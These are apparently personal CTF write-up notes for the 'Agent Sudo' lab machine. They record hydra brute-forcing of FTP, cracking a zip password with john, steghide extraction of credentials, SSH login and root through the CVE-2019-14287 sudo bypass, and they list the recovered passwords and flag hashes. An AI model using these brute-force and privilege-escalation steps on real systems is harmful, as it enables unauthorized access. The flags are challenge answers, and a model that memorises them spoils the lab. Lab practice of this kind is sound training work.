# Agent Sudo
- IP: 10.10.59.59

## Open Ports / Services
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
## Agents
- R aka DesKel: rootflag
- C aka Chris: ftp directory
- J aka James: steg file message

## User-Agent `C`
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

## Bruteforcing `Chris`'s password
- `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP`
- `chris:crystal`

## Downloading pictures
- extract zip from `cutie.png`
- use zip2john and then john to get password
  - `alien`
- `7z e 8702.zip` to unzip
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

## Decode the String `QXJlYTUx`
- Use CyberChef to decode
  - decode from `base64` -> `Area51`

## Get embedded message in `cute-alien.jpg`
- `steghide extract -sf cute-alien.jpg` - pw:Area51
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
- new user `james:hackerrules!`

## SSH using account `james`
- user_flag.txt > `b03d975e8c92a7c04146cfa7a5a313c7
- image:`Alien_autospy.jpg > rev. image search: Roswell alien autopsy

## Privilege Escalation
- `sudo -l` > `(ALL, !root) /bin/bash`
- `CVE-2019-14287`
- root.txt > b53a02f55b57d4439e3341834d70c062

SOLVED
